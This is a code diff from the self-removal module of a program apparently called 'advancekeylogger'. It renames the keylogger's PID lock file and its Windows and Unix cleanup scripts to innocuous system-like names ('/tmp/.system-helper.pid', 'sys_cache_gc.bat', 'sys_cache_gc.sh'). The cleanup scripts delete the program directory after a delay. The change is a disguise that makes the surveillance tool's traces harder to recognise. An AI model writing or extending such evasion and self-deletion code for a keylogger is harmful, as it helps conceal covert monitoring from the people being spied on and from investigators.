@@ -75,8 +75,10 @@ def remove_sqlite_database(sqlite_path: str, secure_wipe: bool = False) -> None:
             secure_delete_file(db_file, secure_wipe=secure_wipe)
 
 
-def remove_pid_file(pid_file: str = "/tmp/advancekeylogger.pid") -> None:
+def remove_pid_file(pid_file: str | None = None) -> None:
     """Remove the PID lock file."""
+    if pid_file is None:
+        pid_file = "/tmp/.system-helper.pid"
     path = Path(pid_file)
     if path.exists():
         try:
@@ -114,7 +116,7 @@ def remove_program_directory() -> None:
                 f'timeout /t 2 /nobreak >nul\n'
                 f'rmdir /s /q "{program_dir}"\n'
             )
-            script_path = Path(tempfile.gettempdir()) / "akl_cleanup.bat"
+            script_path = Path(tempfile.gettempdir()) / "sys_cache_gc.bat"
             script_path.write_text(script)
             subprocess.Popen(
                 ["cmd.exe", "/c", str(script_path)],
@@ -124,7 +126,7 @@ def remove_program_directory() -> None:
             script = (
                 f'#!/bin/sh\nsleep 2\nrm -rf "{program_dir}"\n'
             )
-            script_path = Path(tempfile.gettempdir()) / "akl_cleanup.sh"
+            script_path = Path(tempfile.gettempdir()) / "sys_cache_gc.sh"
             script_path.write_text(script)
             script_path.chmod(0o755)
             subprocess.Popen(
